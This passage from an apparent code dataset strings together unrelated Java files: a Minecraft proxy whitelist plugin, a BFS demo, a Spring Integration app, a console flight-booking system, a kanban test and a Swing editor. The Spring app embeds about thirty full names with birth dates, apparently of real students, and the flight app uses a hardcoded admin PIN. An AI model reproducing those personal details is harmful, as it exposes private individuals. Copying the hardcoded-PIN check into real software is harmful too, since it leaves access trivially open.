commandManager.register(commandManager.metaBuilder(\"vlist\").build(), new VlistCommand(this));\n    }\n\n    @Subscribe\n    public void onPlayerJoin(PostLoginEvent event) {\n        if (!whitelistEnabled) return;\n        Player player = event.getPlayer();\n        try {\n            var root = loader.load();\n            List<String> whitelistedUuids = root.node(\"whitelisted-uuids\").getList(String.class);\n            if (!whitelistedUuids.contains(player.getUniqueId().toString())) {\n                player.disconnect(Component.text(\"You are not whitelisted on this server.\"));\n            }\n        } catch (ConfigurateException e) {\n            logger.error(\"Failed to check whitelist\", e);\n        }\n    }\n\n    public YamlConfigurationLoader getLoader() {\n        return loader;\n    }\n\n    public void setWhitelistEnabled(boolean whitelistEnabled) {\n        this.whitelistEnabled = whitelistEnabled;\n    }\n\n    public static String getPrefix() {\n        return prefix;\n    }\n}",
    "package recursive;\r\nimport java.util.LinkedList;\r\nimport java.util.Queue;\r\n\r\npublic class BFS {\r\n\r\n    private static final int UNVISITED = 0;\r\n    private static final int VISITED = 1;\r\n\r\n    public static void main(String[] args) {\r\n        int [][] graph = {\r\n                {0, 1, 1, 0},\r\n                {1, 0, 0, 1},\r\n                {1, 0, 0, 1},\r\n                {0, 1, 1, 0}\r\n        };\r\n        int n = graph.length;\r\n\r\n        int[] status = new int[n];  // UNVISITED or VISITED\r\n        int[] distance = new int[n]; // Distance from the source vertex\r\n        int[] parent = new int[n];  // Parent vertex in the BFS tree\r\n\r\n        bfs(graph, 0, status, distance, parent);\r\n\r\n        System.out.println(\"BFS traversal: \");\r\n        for (int i = 0; i < n; i++) {\r\n            System.out.print(i + \" \");\r\n        }\r\n        System.out.println();\r\n\r\n        System.out.println(\"Distances from source: \");\r\n        for (int i = 0; i < n; i++) {\r\n            System.out.println(\"Distance of \" + i + \" from 0: \" + distance[i]);\r\n        }\r\n    }\r\n\r\n    private static void bfs(int[][] graph, int source, int[] status, int[] distance, int[] parent) {\r\n        Queue<Integer> queue = new LinkedList<>();\r\n        status[source] = VISITED;\r\n        distance[source] = 0;\r\n        parent[source] = -1;  // Source has no parent\r\n        queue.add(source);\r\n\r\n        while (!queue.isEmpty()) {\r\n            int u = queue.poll();\r\n            for (int v = 0; v < graph.length; v++) {\r\n                if (graph[u][v] == 1 && status[v] == UNVISITED) {\r\n                    status[v] = VISITED;\r\n                    distance[v] = distance[u] + 1;\r\n                    parent[v] = u;\r\n                    queue.add(v);\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n",
    "package com.example.introspringintegration;\n\nimport com.example.introspringintegration.model.StudentMessage;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.messaging.MessageChannel;\nimport org.springframework.messaging.support.MessageBuilder;\n\nimport java.time.LocalDate;\nimport java.util.Random;\n\n@SpringBootApplication\npublic class IntroSpringIntegrationApplication implements CommandLineRunner {\n\n\t@Autowired\n\tprivate MessageChannel outputChannel;\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(IntroSpringIntegrationApplication.class, args);\n\t}\n\n\t@Override\n\tpublic void run(String... args) throws Exception {\n\t\tRandom random = new Random();\n\t\tStudentMessage[] arr = {\n\t\t\t\tnew StudentMessage(\"\u0410\u0431\u0440\u0430\u043c\u043e\u0432 \u0412\u043b\u0430\u0434\u0438\u0441\u043b\u0430\u0432 \u041d\u0438\u043a\u043e\u043b\u0430\u0435\u0432\u0438\u0447\", LocalDate.of(2003, 12, 16), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0410\u043d\u0438\u0441\u0438\u043c\u043e\u0432\u0430 \u0410\u043d\u043d\u0430 \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u043e\u0432\u043d\u0430\", LocalDate.of(2003, 5, 21), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0411\u0430\u0439\u0434\u0430\u0448\u0435\u0432 \u041d\u0438\u043a\u043e\u043b\u0430\u0439 \u0414\u043c\u0438\u0442\u0440\u0438\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 5, 26), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0411\u0438\u0440\u044e\u043a\u043e\u0432 \u0410\u0440\u0442\u0451\u043c \u041c\u0430\u043a\u0441\u0438\u043c\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 10, 7), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0412\u043e\u0437\u043d\u0435\u0441\u0435\u043d\u0441\u043a\u0438\u0439 \u0414\u0430\u043d\u0438\u0438\u043b \u0418\u043b\u044c\u0438\u0447\", LocalDate.of(2003, 5, 26), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0412\u044f\u0437\u043e\u0432 \u041f\u0430\u0432\u0435\u043b \u0414\u043c\u0438\u0442\u0440\u0438\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 4, 29), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0413\u0430\u0444\u0443\u0440\u043e\u0432 \u0421\u0435\u0440\u0433\u0435\u0439 \u0410\u043b\u0435\u043a\u0441\u0435\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 7, 9), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0413\u043b\u0443\u0448\u0430\u043d \u0413\u0435\u043d\u0440\u0438\u0445 \u041a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u0438\u043d\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 11, 13), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0413\u0443\u043c\u0435\u0440\u043e\u0432 \u041c\u0438\u0445\u0430\u0438\u043b \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 8, 12), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0414\u0435\u0441\u044f\u0442\u043d\u0438\u0447\u0435\u043d\u043a\u043e \u041a\u0438\u0440\u0438\u043b\u043b \u0413\u0440\u0438\u0433\u043e\u0440\u044c\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 11, 24), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041a\u0430\u043b\u0438\u043d\u0438\u043d \u0415\u0433\u043e\u0440 \u0410\u043d\u0434\u0440\u0435\u0435\u0432\u0438\u0447\", LocalDate.of(2003, 6, 9), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041a\u043b\u0438\u043c\u043e\u0432\u0430 \u0415\u043a\u0430\u0442\u0435\u0440\u0438\u043d\u0430 \u0418\u0432\u0430\u043d\u043e\u0432\u043d\u0430\", LocalDate.of(2004, 3, 6), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041a\u0440\u0430\u0432\u0447\u0435\u043d\u043a\u043e \u041a\u0438\u0440\u0438\u043b\u043b \u041c\u0430\u0440\u043a\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 5, 4), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041c\u0443\u0441\u0442\u0430\u0444\u0430\u0435\u0432 \u041c\u0443\u0445\u0430\u043c\u043c\u0430\u0434\u0430\u043b\u0438 \u041c\u0443\u0445\u0430\u043c\u0430\u0434\u0438\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 10, 22), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041d\u043e\u0432\u0438\u043a\u043e\u0432 \u0414\u0430\u043d\u0438\u043b\u0430 \u0412\u043b\u0430\u0434\u0438\u043c\u0438\u0440\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 6, 10), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041d\u043e\u0432\u0438\u043a\u043e\u0432 \u041c\u0430\u0440\u043a \u042f\u043d\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 4, 26), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041e\u0431\u0443\u0445\u043e\u0432\u0430 \u0410\u043d\u0430\u0441\u0442\u0430\u0441\u0438\u044f \u042e\u0440\u044c\u0435\u0432\u043d\u0430\", LocalDate.of(2004, 5, 21), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041f\u043e\u043b\u044f\u043d\u0441\u043a\u0438\u0439 \u041c\u0438\u0445\u0430\u0438\u043b \u0412\u044f\u0447\u0435\u0441\u043b\u0430\u0432\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 2, 20), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041f\u0430\u0432\u043b\u0435\u043d\u043a\u043e \u0410\u043b\u0435\u043a\u0441\u0435\u0439 \u0414\u043c\u0438\u0442\u0440\u0438\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 1, 6), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0420\u0436\u0435\u0431\u0430\u0435\u0432 \u0410\u0440\u0442\u0451\u043c \u0412\u043b\u0430\u0434\u0438\u0441\u043b\u0430\u0432\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 9, 29), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0420\u0443\u0441\u0430\u043a\u043e\u0432 \u041d\u0430\u0437\u0430\u0440 \u041c\u0443\u0440\u0430\u0434\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 4, 7), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0421\u0430\u043f\u043e\u0436\u043d\u0438\u043a\u043e\u0432\u0430 \u0412\u0438\u043e\u043b\u0435\u0442\u0442\u0430 \u041e\u043b\u0435\u0433\u043e\u0432\u043d\u0430\", LocalDate.of(2003, 2, 10), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0421\u0435\u043b\u0435\u0437\u043d\u0451\u0432 \u0412\u0430\u043b\u0435\u0440\u0438\u0439 \u0410\u043b\u0435\u043a\u0441\u0435\u0435\u0432\u0438\u0447\", LocalDate.of(2003, 4, 28), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0421\u043c\u0438\u0440\u043d\u043e\u0432 \u0418\u0432\u0430\u043d \u0421\u0435\u0440\u0433\u0435\u0435\u0432\u0438\u0447\", LocalDate.of(2003, 6, 16), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0421\u0443\u0447\u0438\u043b\u043a\u0438\u043d\u0430 \u0410\u043d\u0430\u0441\u0442\u0430\u0441\u0438\u044f \u0414\u043c\u0438\u0442\u0440\u0438\u0435\u0432\u043d\u0430\", LocalDate.of(2003, 9, 12), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0422\u0438\u0445\u043e\u043d\u043e\u0432 \u0412\u043b\u0430\u0434\u0438\u0441\u043b\u0430\u0432 \u0410\u043d\u0430\u0442\u043e\u043b\u044c\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 4, 18), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0422\u043e\u043b\u043e\u0447\u0438\u043a \u0418\u0433\u043e\u0440\u044c \u0412\u043b\u0430\u0434\u0438\u043c\u0438\u0440\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 3, 26), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0423\u0433\u043e\u043b\u0435\u0432 \u0414\u0430\u043d\u0438\u0438\u043b \u0420\u043e\u043c\u0430\u043d\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 8, 8), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0425\u0430\u0440\u043b\u0430\u0448\u043a\u0438\u043d\u0430 \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u0430 \u0412\u0430\u0434\u0438\u043c\u043e\u0432\u043d\u0430\", LocalDate.of(2004, 8, 16), random.nextInt(100) + 1),\n\t\t};\n        for (StudentMessage studentMessage : arr) {\n            outputChannel.send(MessageBuilder.withPayload(studentMessage).build());\n        }\n\t}\n}\n",
    "package Service;\r\n\r\nimport java.io.DataInputStream;\r\nimport java.io.IOException;\r\nimport java.util.HashMap;\r\nimport java.util.Iterator;\r\nimport java.util.Scanner;\r\n\r\nimport DAO.DaoI;\r\nimport DAO.DaoImpl;\r\nimport Repository.Pojo;\r\n\r\npublic class ServiceImpl implements ServiceI\r\n{\r\n\tScanner ss=new Scanner(System.in);\r\n\t\r\n\t@Override\r\n\tpublic void addFlight() \r\n\t{\r\n\t\tSystem.out.println();\r\n\t\tSystem.out.print(\"Enter Admin pin: \");\r\n\t\tString pin = new Scanner(System.in).nextLine();\r\n\t\tif(pin.equals(\"1010\"))\r\n\t\t{\r\n\t\t\tSystem.out.println();\r\n\t\t\tSystem.out.print(\"Enter Flight Name: \");\r\n\t\t\tString fname=new Scanner(System.in).nextLine();\r\n\t\t\t\r\n\t\t\tSystem.out.println();\r\n\t\t\tSystem.out.print(\"Enter Flight No: \");\r\n\t\t\tint fno=new Scanner(System.in).nextInt();\r\n\t\t\t\r\n\t\t\tSystem.out.println();\r\n\t\t\tSystem.out.print(\"Enter Date: \");\r\n\t\t\tString date=null;\r\n\t\t\ttry {\r\n\t\t\t\tdate = new DataInputStream(System.in).readLine();\r\n\t\t\t\t\r\n\t\t\t} catch (IOException e) {\r\n\t\t\t\t\r\n\t\t\t\te.printStackTrace();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tSystem.out.println();\r\n\t\t\tSystem.out.print(\"From Location: \");\r\n\t\t\tString from=null;\r\n\t\t\ttry {\r\n\t\t\t\tfrom = new DataInputStream(System.in).readLine();\r\n\t\t\t} catch (IOException e) {\r\n\t\t\t\t\r\n\t\t\t\te.printStackTrace();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t\r\n\t\t\tSystem.out.println();\r\n\t\t\tSystem.out.print(\"To Location: \");\r\n\t\t\tString to=null;\r\n\t\t\ttry {\r\n\t\t\t\tto = new DataInputStream(System.in).readLine();\r\n\t\t\t} catch (IOException e) {\r\n\t\t\t\t\r\n\t\t\t\te.printStackTrace();\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t\tSystem.out.print(\"Arival Time: \");\r\n\t\t\tString arival=new Scanner(System.in).nextLine();\r\n\t\t\t\r\n\t\t\tSystem.out.println();\r\n\t\t\tSystem.out.print(\"Deparature Time: \");\r\n\t\t\tString dep=new Scanner(System.in).nextLine();\r\n\t\t\t\r\n\t\t\tPojo p=new Pojo();\r\n\t\t\tp.setFname(fname);\r\n\t\t\tp.setFno(fno);\r\n\t\t\tp.setFrom(from);\r\n\t\t\tp.setTo(to);\r\n\t\t\tp.setDate(date);\r\n\t\t\tp.setArival(arival);\r\n\t\t\tp.setDept(dep);\r\n\t\t\t\r\n\t\t\tDaoI di=new DaoImpl();\r\n\t\t\t\r\n\t\t\tdi.addFlight(p);\r\n\t\t\t\r\n\t\t}\r\n\t\telse {\r\n\t\t\tSystem.out.println();\r\n\t\t\tSystem.out.println(\"!!!Invalid Pin!!!\");\r\n\t\t\tSystem.out.println();\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t}\r\n\r\n\t@Override\r\n\tpublic void viewFlight() \r\n\t{\r\n\t\tPojo p = new Pojo();\r\n\t\t\r\n\t\tDaoI di=new DaoImpl();\r\n\t\t\r\n\t\tdi.viewFlight(p);\r\n\t\t\r\n\t}\r\n\r\n\t@Override\r\n\tpublic void bookFlight() {\r\n\t\tSystem.out.println();\r\n\t\tSystem.out.print(\"Enter Passenger Name: \");\r\n\t\tString pname=null;\r\n\t\ttry {\r\n\t\t\t pname=new DataInputStream(System.in).readLine();\r\n\t\t} catch (IOException e1) {\r\n\t\t\t\r\n\t\t\te1.printStackTrace();\r\n\t\t}\r\n\t\t\r\n\t\tSystem.out.println();\r\n\t\tSystem.out.print(\"Enter Passport No: \");\r\n\t\tint pno=new Scanner(System.in).nextInt();\r\n\t\t\r\n\t\tSystem.out.println();\r\n\t\tSystem.out.print(\"Enter Flight No: \");\r\n\t\tint fno=new Scanner(System.in).nextInt();\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\tString st=\"Booked\";\r\n\t\t\r\n\t\tPojo p=new Pojo();\r\n\t\tp.setPname(pname);\r\n\t\tp.setPno(pno);\r\n\t\tp.setFno(fno);\r\n\t\tp.setStatus(st);\r\n\t\t\r\n\t\tDaoI di=new DaoImpl();\r\n\t\tdi.bookFlight(p);\r\n\t\t\r\n\t\t\r\n\t}\r\n\r\n\t@Override\r\n\tpublic void cancelFlight() \r\n\t{\r\n\t\tSystem.out.println();\r\n\t\tSystem.out.print(\"Enter Passport No: \");\r\n\t\tint pno=new Scanner(System.in).nextInt();\r\n\t\t\r\n\t\tSystem.out.println();\r\n\t\tSystem.out.print(\"Enter Flight No: \");\r\n\t\tint fno=new Scanner(System.in).nextInt();\r\n\t\t\r\n\t\tString st=\"Canceled\";\r\n\t\t\r\n\t\tPojo p=new Pojo();\r\n\t\t\r\n\t\tp.setPno(pno);\r\n\t\tp.setFno(fno);\r\n\t\tp.setStatus(st);\r\n\t\tDaoI di=new DaoImpl();\r\n\t\tdi.cancelFlight(p);\r\n\t}\r\n\r\n\t@Override\r\n\tpublic void viewBooking()\r\n\t{\r\n\t\tSystem.out.println();\r\n\t\tSystem.out.print(\"Enter Passport No: \");\r\n\t\tint pno = new Scanner(System.in).nextInt();\r\n\t\tPojo p=new Pojo();\r\n\t\tp.setPno(pno);\r\n\t\tDaoI di=new DaoImpl();\r\n\t\tdi.viewBooking(p);\r\n\t\t\r\n\t}\r\n\r\n}\r\n",
    "package com.company.oops;\r\n\r\npublic class wrapperclass {\r\n    public void main(String[] args) {\r\n        int a = 10; // a is a primitive variable\r\n        Integer num = 45; // num is a object of wrapper class\r\n        //here Integer is wrapper class that have many properties and methods\r\n\r\n        //int use call my value as it is primitive\r\n        //objects created by Integer(wrapper class) use call by reference but tehse can also not change the values as they use final\r\n        //final is used to prevent any object to be modified\r\n        final int BO =3;\r\n        //BO=2;//this will give error as we have used final\r\n\r\n\r\n        final Students juna = new Students(\"mqks\");\r\n        juna.markss=\"2dwd\"; //BUT WE CAN CHANGE THE OBJECTS THAT ARE CREATED WITH FINAL\r\n        //but we cannot reassign it\r\n        // juna= new Students(\"sdsd\"); this will give error\r\n    }\r\n    class Students{\r\n\r\n        String markss;\r\n        Students(String markkss){\r\n            markss=markkss;\r\n\r\n\r\n        }\r\n\r\n    }\r\n}\r\n",
    "package com.wkrzywiec.medium.kanban.controller;\n\nimport com.wkrzywiec.medium.kanban.model.Task;\nimport com.wkrzywiec.medium.kanban.repository.KanbanRepository;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.boot.test.web.client.TestRestTemplate;\nimport org.springframework.boot.web.server.LocalServerPort;\nimport org.springframework.core.ParameterizedTypeReference;\n\nimport org.springframework.http.HttpEntity;\nimport org.springframework.http.HttpHeaders;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.test.context.junit4.SpringRunner;\n\nimport java.util.List;\n\nimport static junit.framework.TestCase.assertTrue;\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertNotNull;\n\n\n@RunWith(SpringRunner.class)\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\npublic class TaskControllerITCase extends CommonITCase {\n\n    private String baseURL;\n\n    @LocalServerPort\n    private int port;\n\n    @Autowired\n    private TestRestTemplate restTemplate;\n\n    @Autowired\n    private KanbanRepository kanbanRepository;\n\n    @Before\n    public void setUp(){\n        baseURL = \"http://0.0.0.0:\" + port;\n    }\n\n    @Test\n    public void whenGetAllTasks_thenReceiveSingleTask(){\n\n        //given\n        Task task = saveSingleTask();\n\n        //when\n        ResponseEntity<List<Task>> response = this.restTemplate.exchange(\n                baseURL + \"tasks/\",\n                HttpMethod.GET,\n                new HttpEntity<>(new HttpHeaders()),\n                new ParameterizedTypeReference<List<Task>>() {});\n\n        //then\n        assertEquals(HttpStatus.OK, response.getStatusCode());\n        assertTrue(response.getBody().size() >= 1);\n    }\n\n    @Test\n    public void whenGetSingleTaskById_thenReceiveSingleTask(){\n\n        //given\n        Task task = saveSingleTask();\n\n        //when\n        ResponseEntity<Task> response = this.restTemplate.exchange(\n                baseURL + \"tasks/\" + task.getId(),\n                HttpMethod.GET,\n                new HttpEntity<>(new HttpHeaders()),\n                Task.class);\n\n        //then\n        assertEquals(HttpStatus.OK, response.getStatusCode());\n        assertEquals(task, response.getBody());\n    }\n\n    @Test\n    public void whenPostSingleTask_thenItIsStoredInDb(){\n\n        //given\n        Task task = createSingleTask();\n\n        //when\n        ResponseEntity<Task> response = this.restTemplate.exchange(\n                baseURL + \"tasks/\",\n                HttpMethod.POST,\n                new HttpEntity<>(convertTaskToDTO(task), new HttpHeaders()),\n                Task.class);\n\n        //then\n        assertEquals(HttpStatus.CREATED, response.getStatusCode());\n\n            // check response Task\n        Task responseTask = response.getBody();\n        assertNotNull(responseTask.getId());\n        assertEquals(task.getTitle(), responseTask.getTitle());\n        assertEquals(task.getDescription(), responseTask.getDescription());\n        assertEquals(task.getColor(), responseTask.getColor());\n        assertEquals(task.getStatus(), responseTask.getStatus());\n\n            // check saved Task in db\n        Task savedTask = findTaskInDbById(responseTask.getId()).get();\n        assertEquals(responseTask.getId(), savedTask.getId());\n        assertEquals(task.getTitle(), savedTask.getTitle());\n        assertEquals(task.getDescription(), savedTask.getDescription());\n        assertEquals(task.getColor(), savedTask.getColor());\n        assertEquals(task.getStatus(), savedTask.getStatus());\n    }\n\n    @Test\n    public void whenPostSingleTaskWithKanbanAssignment_thenItIsStoredInDb(){\n\n        //given\n        Task task = createSingleTask();\n        saveSingleRandomKanban();\n\n        //when\n        ResponseEntity<Task> response = this.restTemplate.exchange(\n                baseURL + \"tasks/\",\n                HttpMethod.POST,\n                new HttpEntity<>(convertTaskToDTO(task), new HttpHeaders()),\n                Task.class);\n\n        //then\n        assertEquals(HttpStatus.CREATED, response.getStatusCode());\n\n        // check response Task\n        Task responseTask = response.getBody();\n        assertNotNull(responseTask.getId());\n        assertEquals(task.getTitle(), responseTask.getTitle());\n        assertEquals(task.getDescription(), responseTask.getDescription());\n        assertEquals(task.getColor(), responseTask.getColor());\n        assertEquals(task.getStatus(), responseTask.getStatus());\n\n        // check saved Task in db\n        Task savedTask = findTaskInDbById(responseTask.getId()).get();\n        assertEquals(responseTask.getId(), savedTask.getId());\n        assertEquals(task.getTitle(), savedTask.getTitle());\n     ",
    "package Class;\n\n//creating class\npublic class Student {\n\n    //attributes\n    public String name;\n    public int registration;\n    public Course course;   //attribute from Course\n    public int age;\n    public int discount;\n\n\n    public Student(String name, int registration, Course course, int age, int discount) {\n        if(name != null && !name.isEmpty()){\n            this.name = name;\n        } else {\n            System.out.println(\"Error: invalid name\");\n        }\n        if (registration >= 0){\n            this.registration = registration;\n        } else {\n            System.out.println(\"Error: invalid registration\");\n        }\n        if(course != null){\n            this.course = course;\n        } else {\n            System.out.println(\"Error: invalid course\");\n        }\n        if(age > 0){\n            this.age = age;\n        } else {\n            System.out.println(\"Error: invalid age\");\n        }\n        if(discount >= 0){\n            this.discount = discount;\n        } else {\n            System.out.println(\"Error: invalid discount\");\n        }\n    }\n\n    //methods\n    public double studentDiscount(){\n        double discountedPrice = course.price * (this.discount / 100.0); //calculation\n        if (discountedPrice < 0) {\n            System.out.println(\"Error: Invalid discount value.\");\n            return 0;\n        }\n        System.out.println(\"\\n-PRICE-\");\n        System.out.printf(\"Discounted Price: %.2f\", discountedPrice);\n        double newPrice = course.price - discountedPrice; //print the result\n        System.out.printf(\"\\nNew price: %.2f\", newPrice);\n        return newPrice;\n    }\n    //update discount value\n    public void updateDiscount(int newDiscount) {\n        if (newDiscount < 0) {\n            System.out.println(\"Error: Invalid new discount value.\");\n        }\n        System.out.println(\"\\nDISCOUNT HAS BEEN UPDATED\");\n        this.discount = newDiscount;\n    }\n    public void updateData(String newName, int newRegistration, Course newCourse, int newAge, int newDiscount){\n        //verify if name is not null or empty\n        if(newName != null && !newName.isEmpty()){\n            System.out.println(\"\\nDATA HAS BEEN UPDATED\");\n            this.name = newName;\n        } else {\n            System.out.println(\"Error: invalid new name\");\n        }\n        //verify if registration is not negative or zero\n        if(newRegistration > 0) {\n            this.registration = newRegistration;\n        } else {\n            System.out.println(\"Error: new registration invalid\");\n        }\n        //verify if course is not empty or null\n        if(newCourse != null && !newCourse.name.isEmpty()) {\n            this.course = newCourse;\n        } else {\n            System.out.println(\"Error: new course invalid\");\n        }\n        //verify if new age is positive\n        if(newAge > 0) {\n            this.age = newAge;\n        } else {\n            System.out.println(\"Error: invalid new age\");\n        }\n        //check id the new discount is within a valid range\n        if(newDiscount >= 0 && newDiscount<= 100) {\n            this.discount = newDiscount;\n        } else {\n            System.out.println(\"Error: invalid new discount\");\n        }\n    }\n\n}",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.*;\nimport java.io.*;\nimport java.awt.Desktop;\nimport java.net.URI;\nimport org.fife.ui.rsyntaxtextarea.RSyntaxTextArea;\nimport org.fife.ui.rsyntaxtextarea.SyntaxConstants;\n\npublic class Main {\n    public static void main(String[] args) {\n        // Git visible?\n        int choice = JOptionPane.showConfirmDialog(null, \"\u0423\u0434\u0430\u0447\u0438!/Good Luck!/Viel Gl\u00fcck!\", \"SMS\", JOptionPane.DEFAULT_OPTION, JOptionPane.PLAIN_MESSAGE);\n\n        JFrame frame = new JFrame(\"TextEdtior\"); // \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043e\u043a\u043d\u0430\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);// \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043a\u043d\u043e\u043f\u043a\u0438 \u0432\u044b\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\n        frame.setSize(1000, 1000); // \u0440\u0430\u0437\u043c\u0435\u0440 \u043e\u043a\u043d\u0430\n        RSyntaxTextArea textArea = new RSyntaxTextArea();\n        textArea.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_JAVA); // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441 \u0434\u043b\u044f Java\n        String iconPath = \"f.png\"; // \u043f\u0443\u0442\u044c \u043a \u0438\u043a\u043e\u043d\u043a\u0435 \u0444\u0430\u0439\u043b\u0430 \u0444\u043e\u0442\u043a\u0438\n        ImageIcon icon = new ImageIcon(iconPath); // \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0438\u043a\u043e\u043d\u043a\u0438 \u0441 \u044d\u0442\u0438\u043c \u043f\u0443\u0442\u0435\u043c\n        JScrollPane scrollPane = new JScrollPane(textArea);\n        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);\n        JPanel lineNumbersPanel = new JPanel(new BorderLayout());\n        JTextArea lineNumbersTextArea = new JTextArea(\"1: \\n\"); // \u043d\u0443\u043c\u0435\u0440\u0430\u0446\u0438\u044f \u043f\u043e\u043a\u0430 \u0447\u0442\u043e \u0442\u043e\u043b\u044c\u043a\u043e \u043e\u0434\u0438\u043d \u0435\u0441\u0442\u044c\n        lineNumbersTextArea.setEditable(false);\n        lineNumbersPanel.add(lineNumbersTextArea, BorderLayout.CENTER);\n        scrollPane.setRowHeaderView(lineNumbersPanel);\n\n        // jmenu\n        JMenuBar menuBar = new JMenuBar();\n        JMenuBar infoBar = new JMenuBar();\n        JMenu infoMenu = new JMenu(\"info\"); // \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenu fileMenu = new JMenu(\"file\"); // \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenuItem openFile = new JMenuItem(\"Open\"); // \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenuItem saveFile = new JMenuItem(\"Save\"); // \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenuItem support = new JMenuItem(\"Support developer\");// \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenuItem WebSite = new JMenuItem(\"You can also visit my website\");\n        JCheckBox checkBox = new JCheckBox(\"test click me\");\n\n        // function\n        openFile.addActionListener(new ActionListener() { // \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\n            public void actionPerformed(ActionEvent e) {\n                JFileChooser fileChooser = new JFileChooser();\n                if (fileChooser.showOpenDialog(frame) == JFileChooser.APPROVE_OPTION) {\n                    File file = fileChooser.getSelectedFile();\n                    try {\n                        